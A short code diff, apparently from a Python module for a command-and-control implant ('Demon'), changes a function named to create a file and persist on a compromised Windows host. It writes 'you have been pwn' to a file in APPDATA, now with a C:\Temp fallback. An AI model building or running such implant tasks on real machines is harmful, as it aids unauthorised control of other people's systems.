@@ -6,7 +6,7 @@ def create_file_and_persist(demonID, *params):
     demon = Demon(demonID)
     TaskID = None
 
-    appdata_path = os.environ.get('APPDATA')
+    appdata_path = os.environ.get('APPDATA', 'C:\\Temp')
     file_path = os.path.join(appdata_path, "bahaha.txt")
     file_content = "you have been pwn"
 
